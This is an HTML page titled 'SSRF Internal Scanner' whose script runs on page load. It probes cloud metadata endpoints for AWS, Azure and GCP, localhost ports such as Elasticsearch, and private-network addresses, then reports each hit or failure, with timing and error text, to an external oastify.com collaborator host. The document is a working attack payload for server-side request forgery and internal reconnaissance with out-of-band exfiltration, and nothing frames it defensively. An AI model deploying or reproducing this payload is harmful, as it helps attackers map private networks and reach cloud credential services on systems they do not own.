<!DOCTYPE html>
<html>
<head>
    <title>SSRF Internal Scanner</title>
</head>
<body>
    <h1>Scanning internal network...</h1>
    <script>
    const collab = 'https://84ad72dbts23ogvbhgx7fmhykpqge97xw.oastify.com';
    
    // Simplified target list (add more after confirming it works)
    const targets = [
        'http://169.254.169.254/latest/meta-data/',          // AWS
        'http://169.254.169.254/metadata/instance?api-version=2017-08-01', // Azure
        'http://metadata.google.internal/computeMetadata/v1/', // GCP
        'http://127.0.0.1:80',
        'http://127.0.0.1:8080',
        'http://127.0.0.1:9200',  // Elasticsearch
        'http://10.0.0.1:80',
        'http://172.16.0.1:80',
        'http://192.168.1.1:80'
    ];

    targets.forEach(url => {
        const start = Date.now();
        fetch(url, { mode: 'no-cors', cache: 'no-cache' })
            .then(() => {
                const time = Date.now() - start;
                fetch(collab + '/success?url=' + encodeURIComponent(url) + '&time=' + time);
            })
            .catch(err => {
                const time = Date.now() - start;
                fetch(collab + '/fail?url=' + encodeURIComponent(url) + '&time=' + time + '&error=' + encodeURIComponent(err.message));
            });
    });
    </script>
</body>
</html>
